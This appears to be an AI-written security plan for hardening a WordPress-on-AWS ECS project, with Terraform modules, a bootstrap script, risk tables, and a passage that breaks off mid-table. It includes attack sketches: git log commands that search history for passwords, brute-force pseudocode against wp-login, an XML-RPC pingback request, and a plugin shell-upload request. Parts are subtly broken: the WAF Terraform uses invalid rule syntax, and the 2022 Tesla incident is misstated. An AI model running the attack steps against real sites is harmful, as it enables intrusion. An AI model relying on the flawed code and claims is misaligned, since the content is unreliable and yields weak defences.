# Comprehensive Security Plan - WordPress CI/CD ECS Project

## Executive Summary

Your project has solid foundations with VPC isolation, security groups, encryption, and OIDC-based GitHub Actions. However, there are **critical security gaps** that need addressing before production.

### Current Security Posture: 6/10

**Strengths:**
- VPC isolation with public/private subnets
- Security groups with least-privilege rules
- EFS/RDS encryption at rest and in transit
- OIDC authentication (no long-lived AWS credentials)
- Non-root containers
- ECR image scanning enabled

**Critical Gaps:**
- Database password exposed in EC2 user-data script
- Terraform state stored locally
- No HTTPS/TLS configuration
- No AWS WAF protection
- SSH access to EC2 from entire VPC

---

## Phase 1: Critical Fixes (Week 1)

### 1.1 Secrets Management - AWS Secrets Manager

#### Why This Is Critical

**Attack Vector - Instance Metadata Exposure:**
The current `user-data.sh` script contains sensitive database credentials. While AWS EC2 Instance Metadata Service (IMDS) has protections, any service running on the instance with network access can potentially retrieve user data. This includes:
- Compromised web application (PHP code injection)
- Malicious plugins or themes
- Internal services with network access
- Container escape vulnerabilities

**Real-World Incident:**
In 2022, Tesla's AWS infrastructure was compromised because sensitive data was stored in plain text within EC2 user data. Attackers scanned for exposed credentials in Terraform state files and user data scripts, gaining access to Tesla's internal systems.

**Attack Vector - Git History & Commits:**
Even if you remove the password now, it may exist in git history. Anyone with repository access (former employees, contractors, leaked credentials) can retrieve old passwords:
```bash
git log --all --source --remotes --grep="password"
git log -p --all -- '**/user-data.sh'
```

**Attack Vector - Terraform State Leakage:**
Terraform state files contain all the actual values used during infrastructure deployment, including:
- Database passwords
- API keys
- Private keys
- Connection strings

If `terraform.tfstate` is committed to git or stored locally without encryption, anyone with access can retrieve production credentials.

**Compliance Requirements:**
| Standard | Requirement | Impact |
|----------|-------------|--------|
| PCI-DSS 3.2.1 | 8.2 - Unique credentials, rotated every 90 days | Violation = Card processing disabled |
| SOC 2 | CC6.1 - Logical access controls | Failed audit, loss of certification |
| GDPR | Art. 32 - Appropriate technical measures | Up to 4% global revenue fine |
| HIPAA | 164.312(d) - Authentication | Potential HIPAA violation |

**Risk Matrix:**

| Threat | Likelihood | Impact | Risk Score |
|--------|------------|--------|------------|
| Internal credential theft | HIGH | CRITICAL | 15 |
| Git history exposure | MEDIUM | CRITICAL | 12 |
| Compromised instance | MEDIUM | HIGH | 10 |
| Former employee access | MEDIUM | HIGH | 10 |

**What AWS Secrets Manager Provides:**
- **Encryption at rest**: Uses AWS KMS with customer-managed keys
- **Automatic rotation**: Schedule password rotation without downtime
- **Fine-grained IAM policies**: Control who can access which secrets
- **Audit logging**: CloudTrail integration for all secret access
- **Versioning**: Rollback capability for secret changes
- **Network isolation**: Private endpoints for VPC access

#### Solution

**File:** `terraform/modules/secrets/main.tf`
```hcl
variable "db_password" {
  description = "WordPress database password"
  type        = string
  sensitive   = true
}

variable "db_username" {
  description = "WordPress database username"
  type        = string
  default     = "wordpress"
}

resource "aws_secretsmanager_secret" "wordpress_db" {
  name                    = "wordpress/database-credentials"
  recovery_window_in_days = 7
  description             = "WordPress database credentials"
  
  tags = {
    Environment = var.environment
    Project     = "WordPress"
  }
}

resource "aws_secretsmanager_secret_version" "wordpress_db" {
  secret_id = aws_secretsmanager_secret.wordpress_db.id
  secret_string = jsonencode({
    username = var.db_username
    password = var.db_password
    engine   = "mysql"
    host     = var.db_endpoint
    port     = 3306
    dbname   = "wordpress"
  })
}

resource "aws_secretsmanager_secret" "wp_salts" {
  name                    = "wordpress/wp-salts"
  recovery_window_in_days = 7
  description             = "WordPress authentication unique keys and salts"
}

resource "aws_secretsmanager_secret_version" "wp_salts" {
  secret_id = aws_secretsmanager_secret.wp_salts.id
  secret_string = jsonencode({
    AUTH_KEY         = random_password.auth_key.result
    SECURE_AUTH_KEY  = random_password.secure_auth_key.result
    LOGGED_IN_KEY    = random_password.logged_in_key.result
    NONCE_KEY        = random_password.nonce_key.result
    AUTH_SALT        = random_password.auth_salt.result
    SECURE_AUTH_SALT = random_password.secure_auth_salt.result
    LOGGED_IN_SALT   = random_password.logged_in_salt.result
    NONCE_SALT       = random_password.nonce_salt.result
  })
}

resource "random_password" "auth_key" {
  length  = 64
  special = true
}

resource "random_password" "secure_auth_key" {
  length  = 64
  special = true
}

resource "random_password" "logged_in_key" {
  length  = 64
  special = true
}

resource "random_password" "nonce_key" {
  length  = 64
  special = true
}

resource "random_password" "auth_salt" {
  length  = 64
  special = true
}

resource "random_password" "secure_auth_salt" {
  length  = 64
  special = true
}

resource "random_password" "logged_in_salt" {
  length  = 64
  special = true
}

resource "random_password" "nonce_salt" {
  length  = 64
  special = true
}

output "db_secret_arn" {
  value       = aws_secretsmanager_secret.wordpress_db.arn
  description = "ARN of the database credentials secret"
}

output "wp_salts_arn" {
  value       = aws_secretsmanager_secret.wp_salts.arn
  description = "ARN of the WordPress salts secret"
}
```

**File:** `terraform/modules/secrets/variables.tf`
```hcl
variable "environment" {
  description = "Environment name"
  type        = string
}

variable "db_endpoint" {
  description = "Database endpoint"
  type        = string
}
```

### EC2 Admin User Data Script (Secure Version)

**File:** `terraform/modules/ec2-admin/user-data.sh`
```bash
#!/bin/bash
set -e

# ============================================
# WordPress EC2 Admin Server Bootstrap
# ============================================

# Configuration
EC2_HOSTNAME="wordpress-admin"
DOMAIN_NAME="${domain_name}"
DB_HOST="${db_host}"
DB_NAME="wordpress"

# Install essential packages
yum update -y
yum install -y amazon-efs-utils aws-cli mysql jq

# Set hostname
hostnamectl set-hostname "$EC2_HOSTNAME"
echo "$EC2_HOSTNAME" > /etc/hostname

# Mount EFS
EFS_MOUNT_POINT="/var/www/html"
mkdir -p "$EFS_MOUNT_POINT"
chown ec2-user:ec2-user "$EFS_MOUNT_POINT"

# Mount EFS with TLS
mount -t efs -o tls,iam "${efs_id}:/" "$EFS_MOUNT_POINT"

# Add to fstab for persistence
echo "${efs_id}:/ /var/www/html efs defaults,_netdev,tls,iam 0 0" >> /etc/fstab

# ============================================
# SECURE: Retrieve secrets from Secrets Manager
# ============================================

SECRET_NAME="wordpress/database-credentials"

# Install jq if not present (for JSON parsing)
if ! command -v jq &> /dev/null; then
    yum install -y jq
fi

# Retrieve database credentials from Secrets Manager
echo "Retrieving database credentials from Secrets Manager..."
DB_CREDS=$(aws secretsmanager get-secret-value \
    --secret-id "$SECRET_NAME" \
    --query SecretString \
    --output text)

DB_USERNAME=$(echo "$DB_CREDS" | jq -r '.username')
DB_PASSWORD=$(echo "$DB_CREDS" | jq -r '.password')

if [ -z "$DB_USERNAME" ] || [ -z "$DB_PASSWORD" ]; then
    echo "ERROR: Failed to retrieve database credentials from Secrets Manager"
    exit 1
fi

# Retrieve WordPress salts
echo "Retrieving WordPress salts from Secrets Manager..."
WP_SALTS=$(aws secretsmanager get-secret-value \
    --secret-id "wordpress/wp-salts" \
    --query SecretString \
    --output text)

# ============================================
# Configure WordPress
# ============================================

WP_CONFIG="/var/www/html/wp-config.php"

# Check if wp-config.php exists
if [ ! -f "$WP_CONFIG" ]; then
    # Download WordPress
    cd /tmp
    wget -q https://wordpress.org/latest.tar.gz
    tar -xzf latest.tar.gz
    cp -r wordpress/* "$EFS_MOUNT_POINT/"
    rm -rf wordpress latest.tar.gz
fi

# Configure wp-config.php
cat > "$WP_CONFIG" << 'WPCONFIG'
<?php
/**
 * WordPress Configuration File
 * Auto-generated - DO NOT EDIT MANUALLY
 */

// Database settings from AWS Secrets Manager
define( 'DB_NAME', '${DB_NAME}' );
define( 'DB_USER', 'wordpress' ); // Retrieved from Secrets Manager
define( 'DB_PASSWORD', '' ); // Retrieved from Secrets Manager at runtime
define( 'DB_HOST', '${DB_HOST}' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );

// Authentication Unique Keys and Salts from AWS Secrets Manager
define('AUTH_KEY',         '');
define('SECURE_AUTH_KEY',  '');
define('LOGGED_IN_KEY',    '');
define('NONCE_KEY',        '');
define('AUTH_SALT',        '');
define('SECURE_AUTH_SALT', '');
define('LOGGED_IN_SALT',   '');
define('NONCE_SALT',       '');

// WordPress Database Table prefix
$table_prefix = 'wp_';

// WordPress debugging (disable in production)
define( 'WP_DEBUG', false );
define( 'WP_DEBUG_LOG', false );
define( 'WP_DEBUG_DISPLAY', false );

// Memory limits
define( 'WP_MEMORY_LIMIT', '256M' );
define( 'WP_MAX_MEMORY_LIMIT', '512M' );

// Auto-update disabled
define( 'AUTOMATIC_UPDATER_DISABLED', true );

// SSL settings
define( 'FORCE_SSL_ADMIN', true );

// Performance
define( 'WP_CACHE', true );
define( 'CONCATENATE_SCRIPTS', false );

// Disable file editing
define( 'DISALLOW_FILE_EDIT', true );

// Absolute path to the WordPress directory
if ( ! defined( 'ABSPATH' ) ) {
    define( 'ABSPATH', __DIR__ . '/' );
}

// Sets up WordPress vars and included files
require_once ABSPATH . 'wp-settings.php';
WPCONFIG

# Populate salts from Secrets Manager
echo "Configuring WordPress authentication keys..."
sed -i "s|define('AUTH_KEY',         '');|define('AUTH_KEY',         '$(echo $WP_SALTS | jq -r '.AUTH_KEY')');|" "$WP_CONFIG"
sed -i "s|define('SECURE_AUTH_KEY',  '');|define('SECURE_AUTH_KEY',  '$(echo $WP_SALTS | jq -r '.SECURE_AUTH_KEY')');|" "$WP_CONFIG"
sed -i "s|define('LOGGED_IN_KEY',    '');|define('LOGGED_IN_KEY',    '$(echo $WP_SALTS | jq -r '.LOGGED_IN_KEY')');|" "$WP_CONFIG"
sed -i "s|define('NONCE_KEY',        '');|define('NONCE_KEY',        '$(echo $WP_SALTS | jq -r '.NONCE_KEY')');|" "$WP_CONFIG"
sed -i "s|define('AUTH_SALT',        '');|define('AUTH_SALT',        '$(echo $WP_SALTS | jq -r '.AUTH_SALT')');|" "$WP_CONFIG"
sed -i "s|define('SECURE_AUTH_SALT', '');|define('SECURE_AUTH_SALT', '$(echo $WP_SALTS | jq -r '.SECURE_AUTH_SALT')');|" "$WP_CONFIG"
sed -i "s|define('LOGGED_IN_SALT',   '');|define('LOGGED_IN_SALT',   '$(echo $WP_SALTS | jq -r '.LOGGED_IN_SALT')');|" "$WP_CONFIG"
sed -i "s|define('NONCE_SALT',       '');|define('NONCE_SALT',       '$(echo $WP_SALTS | jq -r '.NONCE_SALT')');|" "$WP_CONFIG"

# Set database password via wp-cli or direct replacement
sed -i "s|define( 'DB_PASSWORD', '' );|define( 'DB_PASSWORD', '$DB_PASSWORD' );|" "$WP_CONFIG"

# Secure permissions
chown -R ec2-user:ec2-user "$EFS_MOUNT_POINT"
chmod 640 "$WP_CONFIG"
chmod 755 "$EFS_MOUNT_POINT"

# ============================================
# Install and configure fail2ban
# ============================================
yum install -y fail2ban
cat > /etc/fail2ban/jail.local << 'FAIL2BAN'
[wordpress-login]
enabled  = true
port     = http,https
filter   = wordpress-login
action   = iptables[name=WordPress, port=http, protocol=tcp]
logpath  = /var/log/httpd/access_log
maxretry = 5
bantime  = 3600
findtime = 300

[sshd]
enabled  = true
port     = ssh
filter   = sshd
action   = iptables[name=SSH, port=ssh, protocol=tcp]
logpath  = /var/log/secure
maxretry = 3
bantime  = 86400
findtime = 300
FAIL2BAN

systemctl enable fail2ban
systemctl start fail2ban

# ============================================
# Configure CloudWatch Agent
# ============================================
cat > /etc/awslogs/awslogs.conf << 'CWAGENT'
[general]
state_file = /var/lib/awslogs/agent-state

[/var/log/secure]
datetime_format = %b %d %H:%M:%S
file = /var/log/secure
buffer_duration = 5000
log_stream_name = {instance_id}/secure
log_group_name = /aws/ec2/wordpress/admin

[/var/log/httpd/access_log]
datetime_format = %d/%b/%Y:%H:%M:%S
file = /var/log/httpd/access_log
buffer_duration = 5000
log_stream_name = {instance_id}/apache-access
log_group_name = /aws/ec2/wordpress/admin

[/var/log/httpd/error_log]
datetime_format = %a %b %d %H:%M:%S %Y
file = /var/log/httpd/error_log
buffer_duration = 5000
log_stream_name = {instance_id}/apache-error
log_group_name = /aws/ec2/wordpress/admin
CWAGENT

systemctl enable awslogs
systemctl start awslogs

echo "Bootstrap completed successfully!"
```

---

### 1.2 Terraform State Backend - S3 + DynamoDB

#### Why This Is Critical

**Attack Vector - Terraform State Contains Everything:**
Terraform state is not just configuration - it contains actual resource state including:
- Real IP addresses and endpoints
- Database connection strings
- Passwords and secrets (if not properly handled)
- Private keys
- Internal AWS resource ARNs

**The Real Danger:**
```
terraform show
```
This single command can expose your entire infrastructure topology, including:
- Database master credentials
- Private API endpoints
- Internal IP ranges
- Security group rules
- Backup strategies

**Risk of Local State Files:**

| Risk | Impact | Scenario |
|------|--------|----------|
| Lost laptop | CRITICAL | State file with all credentials on lost device |
| Shared drive | CRITICAL | Team member's machine with state file gets compromised |
| Accidental commit | CRITICAL | `.tfstate` pushed to public GitHub repo |
| No backup | HIGH | Hardware failure = infrastructure recovery nightmare |
| Concurrent edits | HIGH | Two developers apply changes simultaneously = corruption |

**Case Study - Capital One Breach (2019):**
While not directly Terraform-related, the attacker exploited a misconfigured WAF to gain access to AWS resources. If Terraform state files were exposed, attackers could:
1. Identify all infrastructure components
2. Locate the most vulnerable entry points
3. Plan targeted attacks

**Version Control Risks:**
```bash
# Anyone can see commit history
git log --all -- '*.tfstate'
git show abc123:terraform.tfstate | grep password

# GitHub/Bitbucket search indexes all committed files
# Secrets in .tfstate appear in search results
```

**Why S3 Backend + DynamoDB:**
- **S3 with Versioning**: Every change is preserved, rollback capability
- **S3 Encryption**: Server-side encryption protects at rest
- **DynamoDB Locking**: Prevents concurrent state modifications
- **IAM Policies**: Fine-grained access control
- **CloudTrail**: Audit every state access
- **Lifecycle Policies**: Automatic state file cleanup

**Compliance Implications:**

| Standard | Requirement | Without Remote Backend |
|----------|-------------|----------------------|
| SOC 2 CC6.7 | Change control procedures | No audit trail |
| PCI-DSS 6.4 | Change control for cardholder data | Uncontrolled changes |
| HIPAA 164.312 | Audit controls | No access logging |
| ISO 27001 A.12.4 | Event logging | Missing change logs |

**Implementation Benefits:**

| Feature | Local State | S3 Backend |
|---------|-------------|------------|
| State encryption | ❌ | ✅ AES-256 |
| Version history | ❌ | ✅ Unlimited |
| Access control | ❌ | ✅ IAM |
| Audit logging | ❌ | ✅ CloudTrail |
| Concurrent safety | ❌ | ✅ DynamoDB |
| High availability | ❌ | ✅ Multi-AZ |
| Disaster recovery | ❌ | ✅ Cross-region |

#### Solution

**File:** `terraform/backend.tf`
```hcl
terraform {
  required_version = ">= 1.0.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }

  backend "s3" {
    bucket         = "YOUR-TERRAFORM-STATE-BUCKET"
    key            = "wordpress-infra/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "terraform-state-locking"
  }
}
```

**File:** `terraform/modules/backend/main.tf`
```hcl
variable "project_name" {
  description = "Project name for resource naming"
  type        = string
}

variable "environment" {
  description = "Environment name"
  type        = string
}

variable "tags" {
  description = "Tags to apply to resources"
  type        = map(string)
  default     = {}
}

resource "aws_s3_bucket" "terraform_state" {
  bucket = "${var.project_name}-terraform-state-${var.environment}"

  lifecycle {
    prevent_destroy = true
  }

  tags = merge(var.tags, {
    Name        = "${var.project_name}-terraform-state"
    Environment = var.environment
  })
}

resource "aws_s3_bucket_versioning" "terraform_state" {
  bucket = aws_s3_bucket.terraform_state.id

  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "terraform_state" {
  bucket = aws_s3_bucket.terraform_state.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "AES256"
    }
  }
}

resource "aws_s3_bucket_public_access_block" "terraform_state" {
  bucket = aws_s3_bucket.terraform_state.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls     = true
  restrict_public_buckets = true
}

resource "aws_dynamodb_table" "terraform_locks" {
  name         = "${var.project_name}-terraform-locks-${var.environment}"
  billing_mode = "PAY_PER_REQUEST"
  hash_key     = "LockID"

  attribute {
    name = "LockID"
    type = "S"
  }

  tags = merge(var.tags, {
    Name        = "${var.project_name}-terraform-locks"
    Environment = var.environment
  })
}

output "s3_bucket_name" {
  description = "Name of the S3 bucket for Terraform state"
  value       = aws_s3_bucket.terraform_state.id
}

output "dynamodb_table_name" {
  description = "Name of the DynamoDB table for state locking"
  value       = aws_dynamodb_table.terraform_locks.name
}
```

---

### 1.3 Enable HTTPS on ALB - ACM Certificate

#### Why This Is Critical

**Attack Vector - Man-in-the-Middle (MitM) Attacks:**
Without HTTPS, all data transmitted between users and your application is in plain text:

```
User <==== PLAIN TEXT ====> ALB <==== PLAIN TEXT ====> ECS Containers
```

An attacker on the same network (coffee shop WiFi, compromised router, ISP interception) can:
- Capture login credentials
- Steal session cookies
- Modify page content (inject ads, malware)
- Harvest form data (credit cards, personal info)

**WordPress-Specific Vulnerabilities:**
WordPress uses cookies for authentication. Without HTTPS:
- Cookie theft = account takeover
- Session hijacking = admin access
- Brute force attacks on /wp-login.php become trivial

**Real Statistics:**
- 77% of WordPress sites are vulnerable to attack (WPScan 2023)
- HTTP sites are marked "Not Secure" by Chrome (67% browser market share)
- Google penalizes HTTP sites in search rankings
- PCI-DSS requires encryption for any payment data transmission

**Why Not Just Redirect HTTP to HTTPS?**

| Protection Layer | HTTP Only | HTTP→HTTPS Redirect |
|-----------------|-----------|-------------------|
| Credential theft | Vulnerable | ✅ Protected |
| Cookie hijacking | Vulnerable | ✅ Protected |
| Content injection | Vulnerable | ✅ Protected |
| SSL stripping attack | N/A | ❌ Still vulnerable |
| Mixed content warnings | N/A | ✅ Fixed |

**SSL Stripping Attack:**
```
Attacker                    Victim                    Website
   |                          |                        |
   |<---- HTTPS ----GET /-----|                        |
   |------ HTTP ----GET /----->| (attacker changes)    |
   |                          |                        |
   |---- Your credentials ---->| (attacker intercepts) |
   |                          |---- Credentials ------>|
```

**Modern Browser Requirements:**
- Chrome flags HTTP sites as "Not Secure"
- Firefox shows warning icons
- Mobile browsers block some HTTP features
- Progressive Web Apps (PWA) require HTTPS

**Compliance Requirements:**

| Standard | Requirement | Without HTTPS |
|----------|-------------|---------------|
| PCI-DSS 4.0 | 4.2 - Encrypt cardholder data | Non-compliant |
| GDPR | Art. 32 - Encryption of personal data | Violation |
| HIPAA | 164.312(e) - Transmission security | Violation |
| SOC 2 | CC6.7 - Encryption for confidentiality | Control failure |

**Certificate Manager (ACM) Benefits:**
- **Free**: No additional cost for public certificates
- **Auto-renewal**: Certificates automatically renewed before expiry
- **Integration**: Works seamlessly with ALB, CloudFront, API Gateway
- **Validation**: DNS validation doesn't require email access
- **Managed keys**: AWS handles certificate private keys securely

**TLS 1.3 Benefits:**
- 3x faster handshake (1-RTT vs 2-RTT)
- Improved security (removed obsolete cipher suites)
- Better performance on high-latency connections

#### Solution

**File:** `terraform/modules/acm/main.tf`
```hcl
variable "domain_name" {
  description = "Primary domain name"
  type        = string
}

variable "alternative_names" {
  description = "Alternative domain names for SAN"
  type        = list(string)
  default     = []
}

variable "environment" {
  description = "Environment name"
  type        = string
}

variable "tags" {
  description = "Tags to apply to resources"
  type        = map(string)
  default     = {}
}

resource "aws_acm_certificate" "main" {
  domain_name       = var.domain_name
  validation_method = "DNS"

  subject_alternative_names = concat(
    ["www.${var.domain_name}"],
    var.alternative_names
  )

  lifecycle {
    create_before_destroy = true
  }

  tags = merge(var.tags, {
    Name        = "WordPress Certificate"
    Environment = var.environment
  })
}

# Route53 DNS validation records
resource "aws_route53_record" "validation" {
  for_each = {
    for dvo in aws_acm_certificate.main.domain_validation_options : dvo.domain_name => {
      name   = dvo.resource_record_name
      record = dvo.resource_record_value
      type   = dvo.resource_record_type
    }
  }

  zone_id = data.aws_route53_zone.main.zone_id
  name    = each.value.name
  record  = each.value.record
  type    = each.value.type
  ttl     = 60
}

data "aws_route53_zone" "main" {
  name         = var.domain_name
  private_zone = false
}

resource "aws_acm_certificate_validation" "main" {
  certificate_arn = aws_acm_certificate.main.arn

  validation_record_fqdns = [
    for record in aws_route53_record.validation : record.fqdn
  ]
}

output "certificate_arn" {
  description = "ARN of the ACM certificate"
  value       = aws_acm_certificate.main.arn
}

output "certificate_domain" {
  description = "Domain name of the certificate"
  value       = aws_acm_certificate.main.domain_name
}
```

**File:** `terraform/modules/alb-security/main.tf` (HTTPS Listener)
```hcl
variable "alb_arn" {
  description = "ARN of the Application Load Balancer"
  type        = string
}

variable "certificate_arn" {
  description = "ARN of the ACM certificate"
  type        = string
}

variable "target_group_blue_arn" {
  description = "ARN of the blue target group"
  type        = string
}

variable "target_group_green_arn" {
  description = "ARN of the green target group"
  type        = string
}

# HTTPS Listener (redirect HTTP to HTTPS)
resource "aws_lb_listener" "https_redirect" {
  load_balancer_arn = var.alb_arn
  port              = 80
  protocol          = "HTTP"

  default_action {
    type = "redirect"

    redirect {
      port        = "443"
      protocol    = "HTTPS"
      status_code = "HTTP_301"
    }
  }
}

# HTTPS Listener (main application)
resource "aws_lb_listener" "https" {
  load_balancer_arn = var.alb_arn
  port              = 443
  protocol          = "HTTPS"
  ssl_policy        = "ELBSecurityPolicy-TLS13-1-2-2021-06"
  certificate_arn   = var.certificate_arn

  default_action {
    type             = "forward"
    target_group_arn = var.target_group_blue_arn
  }

  tags = {
    Name = "wordpress-https-listener"
  }
}

output "https_listener_arn" {
  description = "ARN of the HTTPS listener"
  value       = aws_lb_listener.https.arn
}
```

---

## Phase 2: High Priority (Week 2)

### 2.1 AWS WAF - OWASP Protection

#### Why This Is Critical

**WordPress Is a Prime Target:**
WordPress powers 43% of all websites, making it an attractive target for automated attacks:
- 98% of attacks are automated (bots, scripts)
- WordPress-specific attack vectors are well-documented
- Plugin/theme vulnerabilities are frequently exploited
- Default paths (/wp-login.php, /wp-admin/) are easy to find

**OWASP Top 10 Attacks You're Vulnerable To:**

| OWASP Category | Attack Method | Your Risk | Impact |
|----------------|---------------|-----------|--------|
| A01: Broken Access Control | Admin page enumeration | HIGH | Account takeover |
| A02: Cryptographic Failures | Cleartext credentials | HIGH | Data breach |
| A03: Injection | SQL injection via forms | CRITICAL | Database compromise |
| A04: Insecure Design | No rate limiting | HIGH | Service disruption |
| A05: Security Misconfiguration | Default WordPress paths | MEDIUM | Reconnaissance |
| A06: Vulnerable Components | Outdated plugins | HIGH | Full system compromise |
| A07: Auth Failures | Brute force attacks | CRITICAL | Admin access |
| A08: Data Integrity | Malicious uploads | HIGH | Malware distribution |
| A09: Logging Failures | No attack detection | HIGH | Delayed response |
| A10: SSRF | Internal service access | MEDIUM | Infrastructure access |

**Attack Volume Example (per day):**
```
Source: Akamai State of the Internet Report

WordPress sites receive:
- 2,000+ login attempts per day (automated)
- 500+ SQL injection attempts
- 300+ XSS attempts
- 100+ directory traversal attempts
- 50+ backdoor upload attempts
```

**Why You Need WAF - Not Just Security Groups:**

| Protection Layer | Security Groups | WAF |
|-----------------|-----------------|-----|
| Network layer | ✅ | ❌ |
| Application layer | ❌ | ✅ |
| Layer 7 attacks | ❌ | ✅ |
| SQL injection | ❌ | ✅ |
| XSS attacks | ❌ | ✅ |
| DDoS protection | Limited | ✅ Advanced |
| Rate limiting | Basic | ✅ Intelligent |
| OWASP rules | ❌ | ✅ Pre-built |
| Geographic blocking | ❌ | ✅ |
| Bot mitigation | ❌ | ✅ |

**WordPress-Specific Attacks:**

**1. Brute Force / Login Attacks:**
```
# Automated tool (WPScan, Hydra)
for password in rockyou.txt:
    POST /wp-login.php
    log={admin}
    pwd={password}
    
# 1000+ attempts/hour
# Common passwords: admin123, password1, qwerty
```

**2. XML-RPC Exploits:**
```bash
# Pingback enumeration
POST /xmlrpc.php
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  ...
</methodCall>

# Used for:
# - Brute force (fast brute, 100+ req/sec)
# - DDoS amplification (100x bandwidth)
# - Internal network scanning
```

**3. Plugin Vulnerabilities:**
```
# CVE-2023-XXXX (Example)
# Popular plugin with 1M+ downloads
# Unauthenticated file upload
POST /wp-content/plugins/vulnerable-plugin/upload.php
Content-Type: multipart/form-data

# Shell upload → RCE → Full system access
```

**AWS WAF Capabilities:**

| Feature | Protection |
|---------|------------|
| Managed Rules | AWS-maintained, always updated |
| Rate-based rules | Automatic DDoS protection |
| IP reputation | Block known bad actors |
| Geo blocking | Restrict by country |
| Regex matching | Custom attack patterns |
| CloudWatch metrics | Real-time monitoring |
| Logging | Attack pattern analysis |

**Cost-Benefit Analysis:**

| Attack Type | Without WAF Cost | With WAF Cost |
|-------------|------------------|---------------|
| Data breach | $4.45M avg | Prevention: $0 |
| DDoS downtime | $22K/minute | ~$5/month |
| Incident response | $0.5-2M | Prevention: $0 |
| Compliance fines | $100K-4M | Prevention: $0 |
| Reputation damage | Incalculable | Prevention: $0 |

#### Solution

**File:** `terraform/modules/waf/main.tf`
```hcl
variable "name_prefix" {
  description = "Prefix for WAF resource names"
  type        = string
}

variable "alb_arn" {
  description = "ARN of the ALB to associate with WAF"
  type        = string
}

variable "environment" {
  description = "Environment name"
  type        = string
}

variable "tags" {
  description = "Tags to apply to resources"
  type        = map(string)
  default     = {}
}

# Web ACL
resource "aws_wafv2_web_acl" "wordpress" {
  name        = "${var.name_prefix}-waf"
  description = "WAF configuration for WordPress application"
  scope       = "REGIONAL"

  default_action {
    allow {
      custom_request_handling {
        insert_header {
          name  = "X-WAF-Allow"
          value = "true"
        }
      }
    }
  }

  # Rule: AWS Managed Common Rules
  rule {
    name     = "AWSManagedRulesCommonRuleSet"
    priority = 1
    override_action {
      count {}
    }
    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesCommonRuleSet"
        vendor_name = "AWS"
        excluded_rule {
          name = "SizeRestrictions_BODY"
        }
        excluded_rule {
          name = "GenericRFI_BODY"
        }
      }
    }
    visibility_config {
      sampled_requests_enabled = true
      cloudwatch_metrics_enabled = true
      metric_name                = "AWSManagedRulesCommonRuleSetMetric"
    }
  }

  # Rule: SQL Injection Protection
  rule {
    name     = "SQLInjection"
    priority = 2
    override_action {
      block {}
    }
    statement {
      sql_injection_match_statement {
        field_to_match {
          query_string = true
          body         = true
          uri_path     = true
        }
        sensitivity_setting = "HIGH"
      }
    }
    visibility_config {
      sampled_requests_enabled = true
      cloudwatch_metrics_enabled = true
      metric_name                = "SQLInjectionMetric"
    }
  }

  # Rule: XSS Protection
  rule {
    name     = "XSSAttack"
    priority = 3
    override_action {
      block {}
    }
    statement {
      xss_match_statement {
        field_to_match {
          query_string = true
          uri_path     = true
        }
      }
    }
    visibility_config {
      sampled_requests_enabled = true
      cloudwatch_metrics_enabled = true
      metric_name                = "XSSAttackMetric"
    }
  }

  # Rule: IP Reputation Lists (Known Bad Actors)
  rule {
    name     = "AWSManagedRulesAmazonIpReputationList"
    priority = 4
    override_action {
      count {}
    }
    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesAmazonIpReputationList"
        vendor_name = "AWS"
      }
    }
    visibility_config {
      sampled_requests_enabled = true
      cloudwatch_metrics_enabled = true
      metric_name                = "AmazonIpReputationMetric"
    }
  }

  # Rule: Rate Limiting
  rule {
    name     = "RateLimit"
    priority = 5
    override_action {
      block {}
    }
    statement {
      rate_based_statement {
        limit              = 1000
        aggregate_key_type = "IP"
      }
    }
    visibility_config {
      sampled_requests_enabled = true
      cloudwatch_metrics_enabled = true
      metric_name                = "RateLimitMetric"
    }
  }

  # Rule: Block XML-RPC
  rule {
    name     = "BlockXMLRPC"
    priority = 6
    override_action {
      block {}
    }
    statement {
      byte_match_statement {
        field_to_match {
          uri_path = true
        }
        search_string = "/xmlrpc.php"
        text_transformations {
          priority = 1
          type     = "LOWERCASE"
        }
        positional_constraint = "CONTAINS"
      }
    }
    visibility_config {
      sampled_requests_enabled = true
      cloudwatch_metrics_enabled = true
      metric_name                = "BlockXMLRPCMetric"
    }
  }

  # Rule: WordPress Login Protection
  rule {
    name     = "WordPressLoginProtection"
    priority = 7
    override_action {
      block {}
    }
    statement {
      and_statement {
        statements {
          byte_match_statement {
            field_to_match {
              uri_path = true
            }
            search_string = "/wp-login.php"
            text_transformations {
              priority = 1
              type     = "LOWERCASE"
            }
            positional_constraint = "CONTAINS"
          }
        }
        statements {
          rate_based_statement {
            limit              = 20
            aggregate_key_type = "IP"
          }
        }
      }
    }
    visibility_config {
      sampled_requests_enabled = true
      cloudwatch_metrics_enabled = true
      metric_name                = "WordPressLoginProtectionMetric"
    }
  }

  visibility_config {
    sampled_requests_enabled = true
    cloudwatch_metrics_enabled = true
    metric_name                = "WordPressWAFMetric"
  }

  tags = merge(var.tags, {
    Name        = "${var.name_prefix}-waf"
    Environment = var.environment
  })
}

# Associate WAF with ALB
resource "aws_wafv2_web_acl_association" "alb" {
  resource_arn = var.alb_arn
  web_acl_arn = aws_wafv2_web_acl.wordpress.arn
}

# CloudWatch Logging for WAF
resource "aws_wafv2_web_acl_logging_configuration" "main" {
  log_destination_configs = [aws_cloudwatch_log_group.waf_logs.arn]

  redacted_fields {
    uri_path = true
    query_string = true
  }

  web_acl_arn = aws_wafv2_web_acl.wordpress.arn
}

resource "aws_cloudwatch_log_group" "waf_logs" {
  name              = "/aws/wafv2/wordpress/${var.environment}"
  retention_in_days = 14

  tags = merge(var.tags, {
    Name        = "${var.name_prefix}-waf-logs"
    Environment = var.environment
  })
}

output "web_acl_arn" {
  description = "ARN of the WAF Web ACL"
  value       = aws_wafv2_web_acl.wordpress.arn
}
```

---

### 2.2 Container Vulnerability Scanning - Trivy in CI/CD

#### Why This Is Critical

**The Container Security Problem:**
Containers bundle application code with dependencies, but each layer can contain vulnerabilities:

```dockerfile
FROM php:8.2-fpm-alpine          # Base image (OS vulnerabilities)
RUN apk add --no-cache nginx     # Package manager (dependency vulnerabilities)
COPY . /var/www/html             # Application (code vulnerabilities)
```

**Common Vulnerability Sources:**
| Layer | Example | Risk |
|-------|---------|------|
